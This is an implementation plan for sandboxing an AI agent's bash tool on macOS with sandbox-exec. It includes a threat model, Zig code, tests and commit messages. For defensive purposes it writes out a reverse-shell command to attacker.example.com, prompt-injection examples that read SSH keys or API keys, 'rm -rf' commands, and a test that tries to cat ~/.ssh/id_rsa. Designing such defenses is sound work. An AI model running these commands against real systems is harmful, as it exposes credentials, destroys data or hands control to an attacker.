# Bash Tool Sandbox Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use `superpowers:executing-plans` to implement this plan task-by-task. Each task is one commit. Follow TDD for every task: write the failing test, watch it fail for the right reason, implement, watch it pass, commit.

**Goal:** Replace `tools/bash.zig`'s current "spawn `/bin/sh -c` unrestricted" approach with a principled sandbox on both macOS (Apple `sandbox-exec` with a generated seatbelt profile) and Linux (bubblewrap, or fall back to landlock/seccomp). Adversarial prompt injections that say "print ~/.ssh/id_rsa" will fail at the sandbox boundary rather than leak a key.

**Architecture discovery:** the original "ad-hoc allowlist" the architectural review flagged **does not exist**. There is NO sandbox today; the bash tool spawns `/bin/sh -c` directly with full process privileges. This plan adds the sandbox from scratch as a layered retrofit.

**Scope call:** this is the largest of the Tier B plans. It touches `tools/bash.zig` substantially, introduces platform-conditional code, and requires a deliberate threat model. Splitting into two phases:

- **Phase A (this plan):** macOS seatbelt with a conservative read/write/exec profile, Lua opt-out for power users, documented threat model, rejection tests. Linux gets a clearly-marked "not sandboxed yet" warning.
- **Phase B (separate, later):** Linux sandbox via bubblewrap or landlock+seccomp. Out of scope here.

**Tech Stack:** Zig 0.15, macOS `sandbox-exec` via `std.process.Child`. No Zig-side sandboxing library dependency; the heavy lifting is Apple's.

---

## Ground Rules

1. TDD every task.
2. One task = one commit.
3. `zig build test` green between commits.
4. `zig fmt --check .` before every commit.
5. Worktree Edit discipline.
6. No em dashes.
7. **Platform-sensitive:** every change must work on both macOS (CI runs Linux; local dev is macOS) and Linux (fall back to unsandboxed with warning). Use `@import("builtin").os.tag`.

---

## Threat model (must be stated before coding)

The bash tool runs on behalf of an LLM that may be misaligned or prompt-injected. The sandbox defends against:

1. **Secret exfiltration.** An injection that says "read ~/.ssh/id_rsa and print it" or "print $ANTHROPIC_API_KEY." The sandbox blocks the read; the bash tool returns an error; the injection fails.
2. **Filesystem damage.** `rm -rf ~`, `rm -rf /`. The sandbox restricts writes to `$PWD` + `/tmp`, so damage is scoped.
3. **Lateral movement.** Writing to `~/.ssh/authorized_keys` to grant future SSH access; writing to `~/.bashrc` to persist. Blocked by write-deny outside `$PWD`/`/tmp`.
4. **Network tunneling.** Starting a reverse shell via `nc -e /bin/sh attacker.example.com 4444`. Sandbox denies outbound network except localhost.

What the sandbox does NOT defend against:

- **The agent running `git push` to a compromised remote** when `$PWD` is a git repo it has write access to. We're not preventing the agent from doing legitimate work in the cwd; we're bounding the blast radius.
- **User-consented deviation.** If the user sets `zag.set_bash_sandbox_level("permissive")` in config.lua, they're opting out. Document this clearly.
- **Local privilege escalation via bugs in sandbox-exec itself.** Apple's problem.

---

## Task 1: Write the threat model as a doc comment

**Files:**
- Modify: `src/tools/bash.zig` (top of file `//!` block)

**Step 1: Prepend the threat model**

Replace (or augment) the existing top-of-file doc with:

```zig
//! Bash tool: execute shell commands with a sandbox.
//!
//! Threat model:
//! * Secret exfiltration: denies reads of ~/.ssh, ~/.aws, ~/.config/*-tokens,
//!   ~/.gnupg, /etc/passwd, /private/etc, /Library/Keychains.
//! * Filesystem damage: writes restricted to $PWD and /tmp.
//! * Lateral movement: ~/.ssh/authorized_keys, ~/.bashrc etc. denied by the
//!   write scope.
//! * Network tunneling: outbound network denied except localhost.
//!
//! Platform support:
//! * macOS: sandbox-exec with a generated seatbelt profile.
//! * Linux: not yet sandboxed (see bubblewrap plan). Bash runs unconfined;
//!   users on Linux must trust their agent prompts.
//!
//! Opt-out:
//! * zag.set_bash_sandbox_level("permissive") in config.lua disables the
//!   sandbox entirely. Intended for users who audit prompts themselves.
//!   Emits a warning line on startup when set.
```

**Step 2: Commit**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: document threat model and platform scope

The seatbelt review raised "ad-hoc allowlist"; the actual state is
that there is no allowlist at all. Before adding one, state what we
are and are not defending against so future changes have a stable
anchor.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Add the seatbelt profile builder (macOS-only, unused)

**Files:**
- Modify: `src/tools/bash.zig`

**Step 1: Write failing tests**

Append to `src/tools/bash.zig`:

```zig
test "buildSeatbeltProfile denies ~/.ssh by default" {
    const allocator = std.testing.allocator;

    var home_buf: [256]u8 = undefined;
    const home = try std.fs.cwd().realpath(".", &home_buf);
    _ = home;

    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/tmp/test",
        .home = "/Users/test",
    });
    defer allocator.free(profile);

    // Profile must contain a deny for ~/.ssh and friends.
    try std.testing.expect(std.mem.indexOf(u8, profile, "/Users/test/.ssh") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "deny") != null);

    // Profile must allow cwd reads + writes.
    try std.testing.expect(std.mem.indexOf(u8, profile, "/tmp/test") != null);
}

test "buildSeatbeltProfile allows /tmp for scratch writes" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/home/test/project",
        .home = "/home/test",
    });
    defer allocator.free(profile);

    try std.testing.expect(std.mem.indexOf(u8, profile, "/tmp") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "file-write") != null);
}

test "buildSeatbeltProfile denies outbound network except loopback" {
    const allocator = std.testing.allocator;
    const profile = try buildSeatbeltProfile(allocator, .{
        .cwd = "/tmp/x",
        .home = "/Users/x",
    });
    defer allocator.free(profile);

    try std.testing.expect(std.mem.indexOf(u8, profile, "network-outbound") != null);
    try std.testing.expect(std.mem.indexOf(u8, profile, "localhost") != null or
        std.mem.indexOf(u8, profile, "127.0.0.1") != null);
}
```

**Step 2: Run; confirm failure** (function doesn't exist yet).

**Step 3: Implement the builder**

Append:

```zig
const SandboxInputs = struct {
    cwd: []const u8,
    home: []const u8,
};

/// Generate a seatbelt profile (macOS sandbox-exec DSL) for one bash
/// invocation. The profile is a Scheme-like s-expression describing
/// allow/deny rules for file access, network, and process spawn.
fn buildSeatbeltProfile(allocator: std.mem.Allocator, inputs: SandboxInputs) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    errdefer buf.deinit(allocator);

    try buf.appendSlice(allocator, "(version 1)\n");
    try buf.appendSlice(allocator, "(deny default)\n");
    try buf.appendSlice(allocator, "(allow process-fork)\n");
    try buf.appendSlice(allocator, "(allow process-exec)\n");
    try buf.appendSlice(allocator, "(allow signal (target self))\n");
    try buf.appendSlice(allocator, "(allow sysctl-read)\n");
    try buf.appendSlice(allocator, "(allow file-read-metadata)\n");

    // Read: cwd, home (with denies), standard system paths.
    try buf.writer(allocator).print("(allow file-read* (subpath \"{s}\"))\n", .{inputs.cwd});
    try buf.writer(allocator).print("(allow file-read* (subpath \"{s}\"))\n", .{inputs.home});
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/usr\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/bin\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/opt/homebrew\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/tmp\"))\n");
    try buf.appendSlice(allocator, "(allow file-read* (subpath \"/private/tmp\"))\n");

    // Deny secrets (ordered last so they override the home subpath).
    try buf.writer(allocator).print("(deny file-read* (subpath \"{s}/.ssh\"))\n", .{inputs.home});
    try buf.writer(allocator).print("(deny file-read* (subpath \"{s}/.aws\"))\n", .{inputs.home});
    try buf.writer(allocator).print("(deny file-read* (subpath \"{s}/.gnupg\"))\n", .{inputs.home});
    try buf.writer(allocator).print("(deny file-read* (subpath \"{s}/.config/github\"))\n", .{inputs.home});
    try buf.appendSlice(allocator, "(deny file-read* (subpath \"/Library/Keychains\"))\n");
    try buf.appendSlice(allocator, "(deny file-read* (subpath \"/private/etc/master.passwd\"))\n");

    // Write: cwd + /tmp only.
    try buf.writer(allocator).print("(allow file-write* (subpath \"{s}\"))\n", .{inputs.cwd});
    try buf.appendSlice(allocator, "(allow file-write* (subpath \"/tmp\"))\n");
    try buf.appendSlice(allocator, "(allow file-write* (subpath \"/private/tmp\"))\n");

    // Network: loopback only.
    try buf.appendSlice(allocator, "(allow network-outbound (remote ip \"localhost:*\"))\n");
    try buf.appendSlice(allocator, "(allow network-outbound (remote ip \"127.0.0.1:*\"))\n");
    try buf.appendSlice(allocator, "(allow network-outbound (remote ip \"::1:*\"))\n");

    return buf.toOwnedSlice(allocator);
}
```

**Step 4: Tests pass. Commit.**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: add seatbelt profile builder for macOS sandbox

Generates a sandbox-exec DSL profile per invocation: deny-default,
then allow the narrow set the threat model requires. Reads scoped
to cwd, home (minus secrets), and standard system paths. Writes
scoped to cwd + /tmp. Network scoped to loopback.

Not yet wired into the bash spawn; next commit threads it through
process.Child so Linux takes the unsandboxed fallback.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Wire the sandbox into `execute`

**Files:**
- Modify: `src/tools/bash.zig` (the `execute` function body)

**Step 1: Write a rejection test (macOS only)**

Append:

```zig
test "execute denies reading ~/.ssh on macOS" {
    if (builtin.os.tag != .macos) return error.SkipZigTest;

    const allocator = std.testing.allocator;

    // The agent tries to read the current user's ~/.ssh. If it works,
    // the sandbox failed. If the command returns non-zero (or stderr
    // contains "Operation not permitted"), the sandbox worked.
    const result = try execute(allocator, "cat ~/.ssh/id_rsa 2>&1 || true", null);
    defer if (result.owned) allocator.free(result.content);

    // The content should NOT contain anything that looks like a key header.
    try std.testing.expect(std.mem.indexOf(u8, result.content, "BEGIN") == null);
    try std.testing.expect(std.mem.indexOf(u8, result.content, "PRIVATE KEY") == null);
}
```

**Step 2: Rewrite the spawn path**

Current approximate body of `execute` (lines ~50-100 in `src/tools/bash.zig`):

```zig
var child = std.process.Child.init(&.{ "/bin/sh", "-c", input.command }, allocator);
// ... setup and wait
```

Replace with:

```zig
const argv = switch (builtin.os.tag) {
    .macos => blk: {
        const home = std.posix.getenv("HOME") orelse "/";
        var cwd_buf: [std.fs.max_path_bytes]u8 = undefined;
        const cwd = std.fs.cwd().realpath(".", &cwd_buf) catch "/";
        const profile = try buildSeatbeltProfile(allocator, .{ .cwd = cwd, .home = home });
        defer allocator.free(profile);

        // sandbox-exec reads the profile from stdin via -p<profile> or
        // from a file via -f <path>. -p takes the profile as an argv
        // string; works for our short profile.
        break :blk &.{ "/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", input.command };
    },
    else => &.{ "/bin/sh", "-c", input.command },
};

var child = std.process.Child.init(argv, allocator);
// ... rest of spawn unchanged
```

On macOS: every command runs inside `sandbox-exec -p <profile> /bin/sh -c <command>`. On Linux: unchanged (unconfined, as the threat-model doc now warns).

**Step 3: Run the rejection test** (macOS-only). Confirm it passes.

**Step 4: Commit**

```bash
git add src/tools/bash.zig
git commit -m "$(cat <<'EOF'
tools/bash: wrap shell spawn in sandbox-exec on macOS

Bash commands on macOS now spawn as:
  /usr/bin/sandbox-exec -p <profile> /bin/sh -c <command>

The profile is generated per invocation by buildSeatbeltProfile with
the current home + cwd, so the allow/deny rules reflect the user's
actual environment. Linux still runs unconfined (warned in the
threat-model doc); bubblewrap-based sandbox is a separate plan.

Adds one integration test that attempts to cat ~/.ssh/id_rsa and
confirms no PRIVATE KEY bytes surface in the output.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: Lua opt-out for power users

**Files:**
- Modify: `src/LuaEngine.zig`
- Modify: `src/tools/bash.zig`
- Modify: `src/main.zig`

**Shape:**

- Add a `bash_sandbox_permissive: bool = false` field somewhere reachable by `bash.execute`. Cleanest home: a small `BashConfig` struct on `LuaEngine` that the tool reads via a borrowed pointer.
- Expose `zag.set_bash_sandbox_level(level: string)` in the Lua sandbox; valid values are `"strict"` (default) and `"permissive"`. On `"permissive"`, flip the flag and log a warning.
- `bash.execute` checks the flag before building the seatbelt argv; if permissive, falls back to unsandboxed spawn.

**Step 1: Failing test**

```zig
test "zag.set_bash_sandbox_level(permissive) disables sandbox" {
    const allocator = std.testing.allocator;
    var engine = try LuaEngine.init(allocator);
    defer engine.deinit();

    var bash_config: tools.bash.Config = .{};
    engine.bash_config = &bash_config;

    try engine.lua.doString("zag.set_bash_sandbox_level('permissive')");
    try std.testing.expect(bash_config.permissive);

    try engine.lua.doString("zag.set_bash_sandbox_level('strict')");
    try std.testing.expect(!bash_config.permissive);
}

test "zag.set_bash_sandbox_level rejects unknown level" {
    const allocator = std.testing.allocator;
    var engine = try LuaEngine.init(allocator);
    defer engine.deinit();

    var bash_config: tools.bash.Config = .{};
    engine.bash_config = &bash_config;

    const result = engine.lua.doString("zag.set_bash_sandbox_level('yolo')");
    try std.testing.expectError(error.LuaRuntime, result);
}
```

**Step 2: Implement**

Add the `bash.Config` struct in `src/tools/bash.zig`:

```zig
pub const Config = struct {
    permissive: bool = false,
};
```

Thread a `?*Config` pointer through `bash.execute`, or hand it via a module-level variable set by main.zig. Study the plan-4 pattern (WindowManager / AgentSupervisor borrowed pointers) for the idiom.

Add `input_parser`-style `bash_config: ?*tools.bash.Config = null` to `LuaEngine`. Wire from main.zig (`eng.bash_config = &bash_config`).

Add the `zagSetBashSandboxLevelFn` handler in `injectZagGlobal`:

```zig
fn zagSetBashSandboxLevelFn(lua: *zlua.Lua) !i32 {
    const engine = getZagEngine(lua) orelse return error.LuaError;
    const level = try lua.checkString(1);
    if (std.mem.eql(u8, level, "strict")) {
        if (engine.bash_config) |cfg| cfg.permissive = false;
    } else if (std.mem.eql(u8, level, "permissive")) {
        if (engine.bash_config) |cfg| cfg.permissive = true;
        log.warn("bash sandbox set to permissive; commands run unconfined", .{});
    } else {
        log.warn("zag.set_bash_sandbox_level: unknown level '{s}'", .{level});
        return error.LuaError;
    }
    return 0;
}
```

In `bash.execute`, branch on `cfg.permissive` before wrapping with `sandbox-exec`.

**Step 3: Commit**

```bash
git add src/tools/bash.zig src/LuaEngine.zig src/main.zig
git commit -m "$(cat <<'EOF'
bash: expose zag.set_bash_sandbox_level for opt-out

Users who audit their own prompts can disable the sandbox by calling
zag.set_bash_sandbox_level("permissive") in config.lua. A warning
line is logged on activation so the opt-out is visible in the
startup output. Unknown levels raise a Lua runtime error.

The flag is stored in a small tools.bash.Config struct, borrowed by
LuaEngine the same way input_parser is. Main.zig wires the pointer
next to the other engine borrows.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Out of scope (explicit non-goals)

1. **Linux bubblewrap / landlock / seccomp sandbox.** Separate plan. Requires installing bubblewrap or relying on kernel-level primitives, both of which have non-trivial packaging stories.
2. **Per-command sandbox level.** One level per session; setting per-command is UX complexity without a clear win.
3. **Dynamic policy updates.** The profile is generated once per command from HOME and CWD; if those change mid-session (rare), the next command picks up the new values. Not hot-reloaded.
4. **Network allowlist for specific hosts.** Only loopback; allowing `api.anthropic.com` opens reverse-tunnel risk and doesn't block the threat model's "network tunneling" scenario cleanly.
5. **Mach/IPC allow-list tuning.** `sandbox-exec` with `deny default` implicitly denies Mach lookups; our profile doesn't re-enable any. If a command needs a specific Mach service (`launchctl list`, `pbpaste`), it fails. Add case-by-case if users hit real friction; don't preemptively open holes.

---

## Done when

- [ ] Threat model documented at the top of `src/tools/bash.zig`.
- [ ] `buildSeatbeltProfile` exists and passes 3 unit tests (ssh deny, /tmp allow, network-outbound loopback).
- [ ] `execute` on macOS spawns via `sandbox-exec -p <profile> /bin/sh -c ...`; Linux unchanged (unconfined warning).
- [ ] macOS rejection test: `cat ~/.ssh/id_rsa` produces no PRIVATE KEY bytes in output.
- [ ] `zag.set_bash_sandbox_level("permissive"/"strict")` Lua binding works end-to-end; unknown level raises Lua runtime error.
- [ ] Pre-existing bash tests (echo, non-zero exit, cancel) still pass on both platforms.
- [ ] `zig build test` clean, fmt clean, no em dashes.
- [ ] 4 commits on the branch.

---

## Follow-up: Linux sandbox

Out of scope here. A future plan should:

1. Detect availability of `bwrap` (bubblewrap). If present, wrap commands similarly to `sandbox-exec`.
2. If `bwrap` is missing, optionally use `landlock`-based syscall filtering via a small Zig wrapper, or fall back with the same "not sandboxed; warn once" stance macOS users never hit.
3. Match the same threat model: deny secrets, scope writes to cwd+/tmp, loopback-only network.
